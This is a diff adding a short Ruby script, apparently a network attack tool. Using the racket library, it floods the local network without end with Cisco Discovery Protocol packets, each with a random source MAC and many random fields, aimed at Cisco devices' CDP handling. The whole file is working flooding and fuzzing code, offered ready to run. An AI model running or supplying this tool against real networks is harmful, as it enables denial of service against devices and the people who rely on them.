@@ -1,0 +1,48 @@
+#!/usr/bin/env ruby
+# Spew CDP packets to all Cisco devices on the network
+#
+# Jon Hart <jhart@spoofed.org>
+
+require 'rubygems'
+require 'racket'
+
+unless (ARGV.size >= 1)
+  puts "Usage: $0 <iface> [num fields per CDP packet]"
+  exit 
+end
+
+def tick 
+  @it += 1
+  @it = 0 if @it >= @ticks.size
+  print "\r#{@ticks[@it]}"
+  STDOUT.flush
+end
+
+def randcdp
+  @n.layers[2] = EightOTwoDotThree.new(Misc.randstring(14))
+  @n.layers[2].dst_mac = "01:00:0c:cc:cc:cc"
+  @n.layers[2].length = 0
+  @n.layers[3] = LLC.new()
+  @n.layers[4] = SNAP.new()
+  @n.layers[4].pid = 0x2000
+  @n.layers[5] = CDP.new()
+  @n.layers[5].version = 1
+
+  limit = ARGV[1].to_i || 100
+  1.upto(limit) do |f|
+    @n.layers[5].add_field(f, Misc.randstring(5))
+  end
+  @n.sendpacket
+  tick
+end
+
+@it = 0
+@ticks = %w( / - \\ | )
+
+@n = Racket.new
+@n.iface = ARGV[0]
+
+puts "Spewing..."
+while (true)
+  randcdp
+end
